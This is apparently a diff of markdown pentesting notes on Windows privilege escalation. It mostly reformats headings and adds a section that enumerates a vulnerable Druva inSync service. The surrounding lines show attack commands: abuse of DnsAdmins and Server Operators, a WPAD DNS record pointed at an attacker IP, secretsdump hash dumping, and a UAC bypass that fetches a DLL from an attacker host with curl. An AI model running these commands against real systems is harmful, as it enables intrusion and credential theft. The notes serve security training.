@@ -34,7 +34,7 @@ Sysinternals Suite → We will use several tools from Sysinternals in our enumer
 
 ## Getting lay of the Land
 
-### Situational Awareness
+### **Situational Awareness**
 
 #### Network Information
 
@@ -72,7 +72,7 @@ Test AppLocker Policy
 PS C:\Users\> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
 ```
 
-### Initial Enumeration
+### **Initial Enumeration**
 
 [Windows COmmand Reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands)
 
@@ -186,7 +186,7 @@ PS C:\Users\> net accounts
 ```
 > Get Password Policy
 
-### Communication WIth Processes
+### **Communication WIth Processes**
 
 #### Listing Named Pipes with Pipelist
 
@@ -220,7 +220,7 @@ C:\> accesschk.exe -accepteula -w \pipe\WindscribeService -v
 
 ## Windows Group Privileges
 
-### Event Log Readers
+### **Event Log Readers**
 
 Administrators or members of the Event Log Readers group have permission to access this log
 
@@ -250,7 +250,7 @@ PS C:\> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properti
 
 > Searching the Security event log with Get-WinEvent requires administrator access or permissions adjusted on the registry key HKLM\System\CurrentControlSet\Services\Eventlog\Security. Membership in just the Event Log Readers group is not sufficient.
 
-### DNS ADMINS
+### **DNS ADMINS**
 
 Members of the DnsAdmins group have access to DNS information on the network. The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as NT AUTHORITY\SYSTEM, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. It is possible to use the built-in [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility to specify the path of the plugin DLL
 
@@ -393,7 +393,7 @@ C:\> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.AD.loca
 C:\> Add-DnsServerResourceRecordA -Name wpad -ZoneName AD.local -ComputerName dc01.AD.local -IPv4Address 10.10.14.3
 ```
 
-### Server Operators
+### **Server Operators**
 
 The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.
 
@@ -427,7 +427,7 @@ C:\> sc start <service Name>
 C:\> net localgroup Administrators
 ```
 
-### Dumping Admin hash
+#### Dumping Admin hash
 
 Once we Are member of Admin Group We can dump hashes of admin
 
@@ -437,7 +437,7 @@ attacker@ubuntu[/]$  secretsdump.py <user>@<ip> -just-dc-user administrator
 
 ## Attacking the OS
 
-### User Account Control
+### **User Account Control**
 
 User Account Control (UAC) is a feature that enables a consent prompt for elevated activities. Applications have different integrity levels, and a program with a high level can perform tasks that could potentially compromise the system. When UAC is enabled, applications and tasks always run under the security context of a non-administrator account unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run
 
@@ -523,7 +523,7 @@ PS C:\>curl http://<ip>/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\Wi
 C:\> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 ```
 
-### Weak Permissions
+### **Weak Permissions**
 
 Permissions on Windows systems are complicated and challenging to get right. A slight modification in one place may introduce a flaw elsewhere. Services usually install with SYSTEM privileges, so leveraging a service permissions-related flaw can often lead to complete control over the target system
 
@@ -788,3 +788,45 @@ Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 User     : Public
 ```
 > This [post](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries) and this [site](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) detail many potential autorun locations on Windows systems 
+
+### **Vulnerable Services**
+#### Enumerating Installed Programs
+
+```
+C:\> wmic product get name
+
+Name
+Druva inSync 6.6.3
+```
+
+#### Enumerating Local Ports
+
+```
+C:\> netstat -anoy
+
+ TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324
+```
+
+#### Enumerating Process ID
+
+Map the process ID (PID) 3324 back to the running process.
+
+```
+PS C:\> get-process -Id 3324
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    149      10     1512       6748              3324   0 inSyncCPHwnet64
+
+```
+
+#### Enumerating Running Service
+
+```
+PS C:\> get-service | ? {$_.DisplayName -like 'Druva*'}
+
+Status   Name               DisplayName
+------   ----               -----------
+Running  inSyncCPHService   Druva inSync Client Service
+```
+
